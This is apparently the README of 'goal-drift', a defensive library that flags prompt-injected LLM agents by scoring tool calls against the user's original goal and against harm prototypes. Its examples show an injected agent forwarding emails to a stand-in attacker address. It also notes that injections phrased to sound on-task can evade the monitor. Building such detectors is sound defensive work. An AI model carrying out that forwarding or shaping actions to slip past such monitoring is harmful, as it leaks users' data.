<div align="center">

# 💨 goal-drift

**Prompt injection detection for LLM agents via semantic goal drift monitoring**





</div>

***

When an AI agent is prompt-injected, it doesn't crash — it quietly starts doing something else. **goal-drift** catches that.

It works by locking the user's original goal as an embedding at session start, then scoring every tool call against that goal using cosine similarity. If the agent suddenly tries to forward emails to an attacker, exfiltrate data, or call tools that have nothing to do with the task, goal-drift flags or blocks it before execution.

```
User: "Read my inbox and draft a reply to the Q2 email"

  step 1 — read_emails(folder="inbox")              ✅  sim=0.81  on_task
  step 2 — forward_emails(to="attacker@evil.com")   🚨  sim=0.06  off_task → BLOCKED
```

***

## How it works

Every tool call passes through two checks:

**1. Goal similarity** — cosine similarity between the action description and the locked goal embedding. If the action is too far from what the user asked for, it's flagged.

**2. Harm signal (optional)** — `HarmAnchor` holds a set of harm prototypes (exfiltration, deletion, unauthorised transfers). It computes a `risk_score = harm_sim - goal_sim`. This suppresses false positives: an action that sounds harmful but is actually relevant to the goal won't be penalised.

The final `DriftLevel` is the more severe of the two signals:

| Level | Meaning |
|---|---|
| `on_task` | Action is aligned with the goal |
| `borderline` | Mildly off-task or ambiguous |
| `off_task` | Significant drift — likely injection |

***

## Install

> **Note:** goal-drift is not yet published to PyPI. Install directly from the repository:

```bash
git clone https://github.com/Mintzs/goal-drift.git
cd goal-drift
pip install -e .
```

For LangChain integration:

```bash
pip install -e ".[langchain]"
```

For development and running the eval harness:

```bash
pip install -e ".[dev]"
pip install pyyaml  # required for tests/eval_dataset.py
```

***

## Quick start

### 1. Decorate your tools with `@semantic`

`@semantic` tells goal-drift how to describe what a tool is doing in natural language. Tools without it are skipped — no drift check.

```python
from goal_drift import semantic

@semantic(lambda folder: f"reading emails from the {folder} folder")
def read_emails(folder: str) -> str: ...

@semantic(lambda recipient, content: f"forwarding all emails to external address {recipient}")
def forward_emails(recipient: str, content: str) -> str: ...
```

### 2. Manual usage (no framework)

```python
from goal_drift import GoalAnchor, LocalEmbedder, build_action_description
from goal_drift.core import DriftLevel

embedder = LocalEmbedder()
anchor = GoalAnchor(
    goal_text="Read my inbox and draft a reply to the Q2 email",
    goal_vector=embedder.embed("Read my inbox and draft a reply to the Q2 email"),
    embedder=embedder,
)

# Before each tool call:
action_text = build_action_description(forward_emails, {"recipient": "attacker@evil.com", "content": "all data"})
result = anchor.check(action_text, tool_name="forward_emails")

print(result.level)       # DriftLevel.OFF_TASK
print(result.similarity)  # ~0.06
```

### 3. With HarmAnchor

```python
from goal_drift import GoalAnchor, HarmAnchor, LocalEmbedder, build_action_description

embedder = LocalEmbedder()
harm = HarmAnchor(embedder=embedder)  # loads built-in harm prototypes

anchor = GoalAnchor(
    goal_text="Summarise this document",
    goal_vector=embedder.embed("Summarise this document"),
    embedder=embedder,
)

result = anchor.check(
    action_text=build_action_description(forward_emails, {"recipient": "attacker@evil.com", "content": "data"}),
    tool_name="forward_emails",
    harm_anchor=harm,
)

print(result.level)       # DriftLevel.OFF_TASK
print(result.harm_score)  # high — matched exfiltration prototype
print(result.risk_score)  # harm_score - goal_similarity
```

***

## LangChain integration

goal-drift has three enforcement modes. Pick the one that fits your use case:

| Mode | How | Blocks tool? | Asks user? |
|---|---|---|---|
| **Auto-block** | `wrap_tools_with_drift_check(block_on=...)` | ✅ Yes — raises `GoalDriftViolation` | ❌ No |
| **HITL** | `wrap_tools_with_drift_check(confirm_on=...)` | ✅ Yes — if user denies | ✅ Yes — prompts in terminal |
| **Log only** | `GoalDriftCallback` | ❌ No | ❌ No |

***

### Mode 1 — Auto-block (silent enforcement)

`wrap_tools_with_drift_check` wraps your tools so the drift check runs before each tool executes. When `block_on` is reached, execution stops immediately and raises `GoalDriftViolation`. No user prompt.

```python
import os
from langchain_openai import ChatOpenAI
from langgraph.prebuilt import create_react_agent
from langchain_core.tools import StructuredTool

from goal_drift import semantic, GoalAnchor, HarmAnchor, LocalEmbedder
from goal_drift.core import DriftLevel
from goal_drift.langchain import wrap_tools_with_drift_check, GoalDriftViolation

@semantic(lambda folder: f"reading emails from the {folder} folder")
def read_emails(folder: str) -> str: ...

@semantic(lambda recipient, content: f"forwarding all emails to {recipient}")
def forward_emails(recipient: str, content: str) -> str: ...

task = "Read my inbox and draft a reply to the Q2 email"
embedder = LocalEmbedder()
anchor = GoalAnchor(
    goal_text=task,
    goal_vector=embedder.embed(task),
    embedder=embedder,
)

tools = [StructuredTool.from_function(read_emails), StructuredTool.from_function(forward_emails)]

# block_on=OFF_TASK: tool is blocked automatically, no prompt shown
guarded_tools = wrap_tools_with_drift_check(
    tools=tools,
    anchor=anchor,
    harm_anchor=HarmAnchor(embedder=embedder),  # optional
    block_on=DriftLevel.OFF_TASK,
    confirm_on=None,
)

llm = ChatOpenAI(
    model="google/gemini-flash-2.0",
    base_url="https://openrouter.ai/api/v1",
    api_key=os.environ["OPENROUTER_API_KEY"],
    temperature=0,
)
agent = create_react_agent(llm, guarded_tools)

try:
    agent.invoke({"messages": [("user", task)]})
except GoalDriftViolation as e:
    print(f"Blocked: {e}")
```

***

### Mode 2 — Human-in-the-loop (HITL)

When `confirm_on` is set, goal-drift pauses and prints a warning to the terminal asking the operator to allow or deny the tool call. If denied, `GoalDriftViolation` is raised and the tool does not execute.

```python
# confirm_on=OFF_TASK: operator is prompted when drift hits off_task
guarded_tools = wrap_tools_with_drift_check(
    tools=tools,
    anchor=anchor,
    confirm_on=DriftLevel.OFF_TASK,  # pause and ask
    block_on=None,                   # don't auto-block
)
```

Both `confirm_on` and `block_on` can be set at the same time. For example, HITL on `borderline` and auto-block on `off_task`:

```python
guarded_tools = wrap_tools_with_drift_check(
    tools=tools,
    anchor=anchor,
    confirm_on=DriftLevel.BORDERLINE,
    block_on=DriftLevel.OFF_TASK,
)
```

***

### Mode 3 — Log only (observability)

`GoalDriftCallback` logs every tool call's drift score without interfering with execution. Use this for monitoring in production when you don't want to risk blocking legitimate agent behavior.

> **Note:** LangChain/LangGraph treat callbacks as advisory — exceptions raised inside callbacks are swallowed. This mode cannot block tool execution under any circumstances. Use the wrapper for enforcement.

```python
from goal_drift.langchain import GoalDriftCallback

callback = GoalDriftCallback(
    goal_text=task,
    tool_registry={"read_emails": read_emails, "forward_emails": forward_emails},
)

agent.invoke(
    {"messages": [("user", task)]},
    config={"callbacks": [callback]},
)

# Inspect the full session history after the run
for r in callback.anchor.history:
    print(r)
```

***

## Evaluation

Run the built-in eval harness against the labelled attack dataset:

```bash
# Goal-only evaluation
python tests/eval_dataset.py

# Combined goal + harm evaluation
python tests/eval_dataset.py --with-harm
```

Results on `tests/attacks/dataset.yaml` (46 labelled cases):

| Mode | Accuracy | Notes |
|---|---|---|
| Goal similarity only | 69.57% | Misses semantically close injections |
| Goal + HarmAnchor | 78.26% | +8.7pp from harm signal |

The harness also prints suggested threshold values if your numbers are off after swapping embedding models.

***

## Tuning thresholds

Default thresholds in `GoalAnchor`:

| Parameter | Default | Effect |
|---|---|---|
| `on_task_threshold` | `0.40` | Actions above this are `on_task` |
| `off_task_threshold` | `0.30` | Actions below this are `off_task` |
| `step_delta_threshold` | `0.65` | Sudden jump between steps escalates `borderline` → `off_task` |

Risk thresholds passed to `anchor.check()`:

| Parameter | Default | Effect |
|---|---|---|
| `risk_borderline` | `0.0` | `risk_score` above this → `borderline` |
| `risk_off_task` | `0.15` | `risk_score` above this → `off_task` |

**If swapping embedding models**, thresholds will need recalibration — similarity scores are model-specific. Re-run the eval harness and use the printed suggestions.

***

## Architecture

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for a full walkthrough of every component, the flow diagram, and integration guidance.

### File map

```
src/goal_drift/
├── core.py        # GoalAnchor, DriftResult, DriftLevel, cosine_sim
├── harm.py        # HarmAnchor, harm prototype matrix
├── embedder.py    # BaseEmbedder, LocalEmbedder
├── semantic.py    # @semantic decorator, build_action_description()
├── langchain.py   # wrap_tools_with_drift_check(), GoalDriftCallback
└── __init__.py    # public API (langchain.py excluded — optional dep)

tests/
├── attacks/
│   └── dataset.yaml   # labelled injection + clean cases
└── eval_dataset.py    # evaluation harness
```

***

## Limitations

- **Threshold sensitivity** — default thresholds were calibrated on `all-MiniLM-L6-v2`. Swapping models requires re-tuning.
- **Semantic similarity is not a firewall** — a well-crafted injection that sounds on-task may pass. goal-drift is a detection layer, not a guarantee.
- **LangChain callback cannot block** — use `wrap_tools_with_drift_check` for enforcement.
- **Tools without `@semantic` are skipped** — undecorated tools receive no drift check.

***

## Contributing

Issues and pull requests are welcome. If you find an injection pattern that evades detection, please open an issue with the case — it will be added to `tests/attacks/dataset.yaml`.

***

## License

MIT
